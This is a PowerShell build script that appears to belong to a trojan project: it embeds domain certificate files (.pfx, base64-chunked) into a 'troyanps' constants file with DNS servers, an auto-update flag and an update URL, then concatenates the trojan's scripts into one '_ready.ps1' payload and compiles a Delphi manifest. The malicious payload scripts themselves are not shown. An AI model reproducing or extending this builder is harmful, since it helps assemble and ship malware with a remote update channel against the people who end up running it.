param (
    [string]$serverName
)
if ([string]::IsNullOrEmpty($serverName)) {
        throw "-serverName argument is null"
}
. .\current.ps1 -serverName $serverName
$scriptDir = Split-Path -Parent $MyInvocation.MyCommand.Path

Write-Host "preCompile"


#certs
$template = @"
`$PrimaryDNSServer = '1.1.1.1'
`$SecondaryDNSServer = '2.2.2.2'
`$autoUpdate = '_autoUpdate'
`$updateUrl = '_updateUrl'
`$xdata = @{
    JOPA
}
"@
$stringList = @()
foreach ($domain in $server.domains) {
    if (-not [string]::IsNullOrWhiteSpace($domain)) 
    {
        $pathPfx = Join-Path -Path $scriptDir -ChildPath "..\..\cert\$domain.pfx"
        $pathPfx = (Resolve-Path -Path $pathPfx).Path
        if ([string]::IsNullOrEmpty($pathPfx)) {
            throw "The certficiate is not found for domain: $domain"
        }
        $binaryData = [System.IO.File]::ReadAllBytes($pathPfx)
        $base64 = [Convert]::ToBase64String($binaryData)
        $chunkSize = 200
        $chunks = @()
        for ($i = 0; $i -lt $base64.Length; $i += $chunkSize) {
            $chunk = $base64.Substring($i, [Math]::Min($chunkSize, $base64.Length - $i))
            $chunks += $chunk
        }
        $code = "'" + ($chunks -join "'+ "  + [System.Environment]::NewLine + "'") + "'"
        $stringList += "'" + $domain + "'=" + $code
    }
}
$listString = $stringList -join [System.Environment]::NewLine
$template = $template -replace "1\.1\.1\.1", $server.primaryDns
$template = $template -replace "2\.2\.2\.2", $server.secondaryDns
$template = $template -replace "_autoUpdate", $server.autoUpdate
$template = $template -replace "_updateUrl", $server.updateUrl
$template  = $template -replace "JOPA", $listString
$troyan = Join-Path -Path $scriptDir -ChildPath '..\troyanps\consts.ps1'
$template | Set-Content -Path $troyan

#join
$sourceDir = Join-Path -Path $scriptDir -ChildPath "..\troyanps"
$destinationFile = Join-Path -Path $scriptDir -ChildPath "_ready.ps1"
$ps1Files = Get-ChildItem -Path $sourceDir -Filter "*.ps1"
$joinedContent = ""
foreach ($file in $ps1Files) {
    $fileContent = Get-Content -Path $file.FullName -Raw
    $joinedContent += $fileContent + [System.Environment]::NewLine
}
$joinedContent | Set-Content -Path $destinationFile -Encoding UTF8

& (Join-Path -Path $scriptDir -ChildPath "./precompile.embeddings.ps1") -serverName $serverName   

#compile manifest
$manifestFile = Join-Path -Path $scriptDir -ChildPath "dns.manifest.rc"
& "C:\Program Files (x86)\Borland\Delphi7\Bin\brcc32.exe" "$manifestFile"